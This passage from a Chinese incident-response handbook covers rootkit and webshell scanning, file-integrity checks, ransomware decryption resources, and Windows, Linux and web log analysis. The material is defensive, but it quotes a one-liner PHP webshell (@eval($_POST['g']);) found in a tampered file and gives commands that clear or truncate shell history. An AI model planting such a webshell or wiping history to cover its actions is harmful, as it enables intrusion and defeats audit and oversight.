new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 0x02 工具篇2.1 Rootkit查杀 chkrootkit 网址：http://www.chkrootkit.org 使用方法： wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz tar zxvf chkrootkit.tar.gz cd chkrootkit-0.52 make sense #编译完成没有报错的话执行检查 ./chkrootkit rkhunter 网址：http://rkhunter.sourceforge.net 使用方法： Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gz tar -zxvf rkhunter-1.4.4.tar.gz cd rkhunter-1.4.4 ./installer.sh --install rkhunter -c 2.2 病毒查杀 Clamav ClamAV的官方下载地址为：http://www.clamav.net/download.html 安装方式一： 1、安装zlib： wget http://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvf zlib-1.2.7.tar.gz cd zlib-1.2.7 #安装一下gcc编译环境： yum install gcc CFLAGS=\"-O3 -fPIC\" ./configure --prefix= /usr/local/zlib/ make &amp;&amp; make install 2、添加用户组clamav和组成员clamav： groupadd clamav useradd -g clamav -s /bin/false -c \"Clam AntiVirus\" clamav 3、安装Clamav tar –zxvf clamav-0.97.6.tar.gz cd clamav-0.97.6 ./configure --prefix=/opt/clamav --disable-clamav -with-zlib=/usr/local/zlib make make install 4、配置Clamav mkdir /opt/clamav/logs mkdir /opt/clamav/updata touch /opt/clamav/logs/freshclam.log touch /opt/clamav/logs/clamd.log cd /opt/clamav/logs chown clamav:clamav clamd.log chown clamav:clamav freshclam.log 5、ClamAV 使用： /opt/clamav/bin/freshclam 升级病毒库 ./clamscan –h 查看相应的帮助信息 ./clamscan -r /home 扫描所有用户的主目录就使用 ./clamscan -r --bell -i /bin 扫描bin目录并且显示有问题的文件的扫描结果 安装方式二： #安装 yum install -y clamav #更新病毒库 freshclam #扫描方法 clamscan -r /etc --max-dir-recursion=5 -l /root/etcclamav.log clamscan -r /bin --max-dir-recursion=5 -l /root/binclamav.log clamscan -r /usr --max-dir-recursion=5 -l /root/usrclamav.log #扫描并杀毒 clamscan -r --remove /usr/bin/bsd-port clamscan -r --remove /usr/bin/ clamscan -r --remove /usr/local/zabbix/sbin #查看日志发现 cat /root/usrclamav.log |grep FOUND 2.3 webshell查杀linux版： 河马webshell查杀：http://www.shellpub.com 深信服Webshell网站后门检测工具：http://edr.sangfor.com.cn/backdoor_detection.html 2.4 RPM check检查​ 系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了： ./rpm -Va &gt; rpm.log 如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下： S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验是否改变（可以看成文件内容是否改变） D 设备中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变 如果命令被替换了，如果还原回来： 文件提取还原案例： rpm -qf /bin/ls 查询ls命令属于哪个软件包 mv /bin/ls /tmp 先把ls转移到tmp目录下，造成ls命令丢失的假象 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下 cp /root/bin/ls /bin/ 把ls命令复制到/bin/目录 修复文件丢失 2.5 linux安全检查脚本Github项目地址： https://github.com/grayddq/GScan https://github.com/ppabc/security_check https://github.com/T0xst/linux 尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。 第3篇：常见的Webshell查杀工具当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。 本文推荐了10款Webshll检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种WebShell检测能力，比如阿里云、青藤云、safedog等，本文暂不讨论。 1、D盾_Web查杀 阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。 兼容性：只提供Windows版本。 工具下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip 2、百度WEBDIR+ 下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。 兼容性：提供在线查杀木马，免费开放API支持批量检测。 在线查杀地址：https://scanner.baidu.com/ 3、河马 专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。 兼容性：支持Windows、linux，支持在线查杀。 官方网站：https://www.shellpub.com/ 4、Web Shell Detector Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。 兼容性：提供php/python脚本，可跨平台，在线检测。 官方网站：http://www.shelldetector.com/ github项目地址：https://github.com/emposha/PHP-Shell-Detector 5、CloudWalker（牧云） 一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。 兼容性，提供linux版本，Windows 暂不支持。 在线查杀demo：https://webshellchop.chaitin.cn/ github项目地址：https://github.com/chaitin/cloudwalker 6、Sangfor WebShellKill Sangfor WebShellKill(网站后门检测工具)是一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。 兼容性：支持Windows、linux 工具下载地址：http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问） 7、深度学习模型检测PHP Webshell 一个深度学习PHP webshell查杀引擎demo，提供在线样本检测。 在线查杀地址：http://webshell.cdxy.me/ 8、PHP Malware Finder PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具 兼容性：提供linux版本，Windows 暂不支持。 github项目地址：https://github.com/jvoisin/php-malware-finder 9、findWebshell 这个项目是一款基于python开发的webshell检查工具，可以根据特征码匹配检查任意类型的webshell后门。 github项目地址：https://github.com/he1m4n6a/findWebshell 10、在线webshell查杀工具 在线查杀地址：http://tools.bugscaner.com/killwebshell/ 第4篇：如何发现隐藏的Webshell后门如何在百万行代码里发现隐藏的后门 试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来嘛？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。 即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。 最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。 本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。 1、文件MD5校验 下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个exe可执行文件，还有一个文件md5值。这个是软件作者在发布软件时，通过md5算法计算出该exe文件的“特征值”。 下载地址：http://www.d99net.net/down/WebShellKill_V2.0.9.zip 文件MD5：29285decadbce3918a4f8429ec33df46 WebShellKill.exe 当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。 那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。 文件hash值计算： def md5sum(file): m=hashlib.md5() if os.path.isfile(file): f=open(file,'rb') for line in f: m.update(line) f.close else: m.update(file) return (m.hexdigest()) 对文件进行哈希值重新计算，进行校验对比，测试效果： 如上图，在上传目录新增了一个evil.php文件，还有一个被篡改的文件是low.php。使用常见的编辑器NotePad++进行对比，可以发现low.php文件里被插入了一句话webshell。 2、diff命令 在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。 diff -c -a -r cms1 cms2 如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现low.php文件被篡改过，篡改的内容是@eval($_POST['g']);。 备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上－q选项。 3、版本控制工具 版本控制工具，比如说git，重新上传代码到git，add+commit+push，然后打开项目，点击commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。 另外，也可以通过git diff 用来比较文件之间的不同。 4、文件对比工具 关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare和WinMerge。 Beyond Compare Beyond Compare是一套由Scooter Software推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。 下载地址：http://www.scootersoftware.com/download.php 软件使用示例，通过文件夹比较，找出文件夹中的差异内容。 1、双击Beyond Compare ，打开软件主页，选择文件夹比较。 2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。 3、双击具体文件，进入代码对比，找到代码差异部分。 WinMerge WinMerge是一款运行于Windows系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。 下载地址：https://winmerge.org/downloads/ 1、文件–打开，选择文件或文件夹，然后点击进行比较。 2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。 第5篇：勒索病毒自救指南经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？ 第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。 出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。 作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。 本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。 勒索病毒搜索引擎 在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。 这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。 【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒， http://lesuobingdu.360.cn 【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒 https://guanjia.qq.com/pr/ls/ 【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族 https://lesuo.venuseye.com.cn/ 【奇安信】勒索病毒搜索引擎 https://lesuobingdu.qianxin.com/ 【深信服】勒索病毒搜索引擎 https://edr.sangfor.com.cn/#/information/ransom_search 勒索软件解密工具集 很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。 【腾讯哈勃】勒索软件专杀工具 https://habo.qq.com/tool/index 【金山毒霸】勒索病毒免疫工具 http://www.duba.net/dbt/wannacry.html 【火绒】安全工具下载 http://bbs.huorong.cn/forum-55-1.html 【瑞星】解密工具下载 http://it.rising.com.cn/fanglesuo/index.html 【nomoreransom】勒索软件解密工具集 https://www.nomoreransom.org/zh/index.html 【MalwareHunterTeam】勒索软件解密工具集 https://id-ransomware.malwarehunterteam.com/ 【卡巴斯基】免费勒索解密器 https://noransom.kaspersky.com/ 【Avast】免费勒索软件解密工具 https://www.avast.com/zh-cn/ransomware-decryption-tools 【Emsisoft】免费勒索软件解密工具 https://www.emsisoft.com/ransomware-decryption-tools/free-download 【Github项目】勒索病毒解密工具收集汇总 https://github.com/jiansiting/Decryption-Tools 第二章：日志分析篇第1篇:Window日志分析0x01 Window事件日志简介Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。 Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。 系统日志 记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。 默认位置： %SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 应用程序日志 包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 安全日志 记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。 默认位置：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx ​ 系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 0X02 审核策略与事件查看器Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。 PS：默认状态下，也会记录一些简单的日志，日志默认大小20M 设置1：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作： 设置2：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： 查看系统日志方法： 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器” 按 “Window+R“，输入 ”eventvwr.msc“ 也可以直接进入“事件查看器” 0x03 事件日志分析对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明： 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录。 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时。 4 批处理（Batch） 通常表明某计划任务启动。 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行。 7 解锁（Unlock） 屏保解锁。 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP。 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序。 10 远程交互，（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机。 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。 原文链接 ：https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008 案例1：可以利用eventlog事件来查看系统账号登录情况： 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 在事件查看器中，单击“安全”，查看安全日志； 在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 4624 –登录成功4625 –登录失败4634 – 注销成功4647 – 用户启动的注销4672 – 使用超级用户（如管理员）进行登录 我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。 案例2：可以利用eventlog事件来查看计算机开关机的记录： 1、在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； 2、在事件查看器中，单击“系统”，查看系统日志； 3、在系统日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。 6005 信息 EventLog 事件日志服务已启动。(开机) 6006 信息 EventLog 事件日志服务已停止。(关机) 6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机 我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。 0x04 日志分析工具Log ParserLog Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。 Log Parser 2.2下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=24659 Log Parser 使用示例：https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/ 基本查询结构 Logparser.exe –i:EVT –o:DATAGRID \"SELECT * FROM c:\\xx.evtx\" 使用Log Parser分析日志 1、查询登录成功的事件 登录成功的所有事件 LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4624\" 指定登录时间范围的事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where TimeGenerated&gt;'2018-06-19 23:32:11' and TimeGenerated&lt;'2018-06-20 23:34:00' and EventID=4624\" 提取登录成功的用户名和IP： LogParser.exe -i:EVT –o:DATAGRID \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as Username,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM c:\\Security.evtx where EventID=4624\" 2、查询登录失败的事件 登录失败的所有事件： LogParser.exe -i:EVT –o:DATAGRID \"SELECT * FROM c:\\Security.evtx where EventID=4625\" 提取登录失败用户名进行聚合统计： LogParser.exe -i:EVT \"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as Times,EXTRACT_TOKEN(Message,39,' ') as Loginip FROM c:\\Security.evtx where EventID=4625 GROUP BY Message\" 3、系统历史开关机记录： LogParser.exe -i:EVT –o:DATAGRID \"SELECT TimeGenerated,EventID,Message FROM c:\\System.evtx where EventID=6005 or EventID=6006\" LogParser Lizard对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。 下载地址：http://www.lizard-labs.com/log_parser_lizard.aspx 依赖包：Microsoft .NET Framework 4 .5，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=42642 查询最近用户登录情况： Event Log ExplorerEvent Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。 下载地址：https://event-log-explorer.en.softonic.com/ 参考链接： Windows日志分析 https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ 第2篇:Linux日志分析0x00 前言Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。 0x01 日志简介日志默认存放位置：/var/log/ 查看日志配置情况：more /etc/rsyslog.conf 日志文件 说明 /var/log/cron 记录了系统定时任务相关的日志 /var/log/cups 记录打印信息的日志 /var/log/dmesg 记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息 /var/log/mailog 记录邮件信息 /var/log/message 记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询 /var/log/secure 记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中 比较重要的几个日志： 登录失败记录：/var/log/btmp //lastb 最后一次登录：/var/log/lastlog //lastlog 登录成功记录: /var/log/wtmp //last 登录日志记录：/var/log/secure ​ 目前登录用户信息：/var/run/utmp //w、who、users ​ 历史命令记录：history​ 仅清理当前用户： history -c 0x02 日志分析技巧A、常用的shell命令Linux下常用的shell命令如：find、grep 、egrep、awk、sed 小技巧： 1、grep显示前后几行信息: ​ 标准unix/linux下的grep通过下面參数控制上下文： ​ grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行 ​ grep -B 5 foo file 显示foo及前5行 ​ grep -A 5 foo file 显示foo及后5行 ​ 查看grep版本号的方法是 ​ grep -V 2、grep 查找含有某字符串的所有文件 grep -rn \"hello,world!\" * : 表示当前目录所有文件，也可以是某个文件名 -r 是递归查找 -n 是显示行号 -R 查找所有文件包含子目录 -i 忽略大小写 3、如何显示一个文件的某几行： cat input_file | tail -n +1000 | head -n 2000 #从第1000行开始，显示2000行。即显示1000~2999行 4、find /etc -name init //在目录/etc中查找文件init5、只是显示/etc/passwd的账户 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F指定域分隔符为':'，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。6、sed -i ‘153,$d’ .bash_history 删除历史操作记录，只保留前153行B、日志分析技巧A、/var/log/secure 1、定位有多少IP在爆破主机的root帐号： grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 定位有哪些IP在爆破： grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c 爆破用户名字典是什么？ grep \"Failed password\" /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2、登录成功的IP有哪些： grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 登录成功的日期、用户名、IP： grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3、增加一个用户kali日志： Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4、删除用户kali日志： Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5、su切换用户： Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2、/var/log/yum.log 软件安装升级卸载日志： yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 第3篇:Web日志分析ox01 Web日志Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。 我们来看一条Apache的访问日志： 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" 通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。 本文通过介绍Web日志安全分析时的思路和常用的一些技巧。 0x02 日志分析技巧在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。 第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。 第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。 常用分析工具： Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。 Linux下，使用Shell命令组合查询分析。 Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。 Apache日志分析技巧： 1、列出当天访问次数最多的IP命令： cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2、查看当天有多少个IP访问： awk '{print $1}' log_file|sort|uniq|wc -l 3、查看某一个页面被访问的次数： grep \"/index.php\" log_file | wc -l 4、查看每一个IP访问了多少个页面： awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5、将每个IP访问的页面数进行从小到大排序： awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6、查看某一个IP访问了哪些页面： grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7、去掉搜索引擎统计当天的页面： awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8、查看2018年6月21日14时这一个小时内有多少IP访问: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l 0x03 日志分析案例Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。 在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？ 这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。 1、定位攻击源 首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。 浏览器指纹： Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2、搜索相关日志记录 通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。 3、对找到的访问日志进行解读，攻击者大致的访问路径如下： A、攻击者访问首页和登录页 B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx C、攻击者访问Xzuser.aspx D、攻击者多次POST（怀疑通过这个页面上传模块缺陷） E、攻击者访问了图片木马 打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。 0x04 日志统计分析技巧统计爬虫： grep -E 'Googlebot|Baiduspider' /www/logs/access.2019-02-23.log | awk '{ print $1 }' | sort | uniq 统计浏览器： cat /www/logs/access.2019-02-23.log | grep -v -E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq -c | sort -r -n | head -n 100 IP 统计： grep '23/May/2019' /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -r -n | head -n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 统计网段： cat /www/logs/access.2019-02-23.log | awk '{print $1}' | awk -F'.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq -c | sort -r -n | head -n 200 统计域名： cat /www/logs/access.2019-02-23.log |awk '{print $2}'|sort|uniq -c|sort -rn|more HTTP Status： cat /www/logs/access.2019-02-23.log |awk '{print $9}'|sort|uniq -c|sort -rn|more 5056585 304 1125579 200 7602 400 5 301 URL 统计： cat /www/logs/access.2019-02-23.log |awk '{print $7}'|sort|uniq -c|sort -rn|more 文件流量统计： cat /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort -rn|more grep ' 200 ' /www/logs/access.2019-02-23.log |awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}'|sort 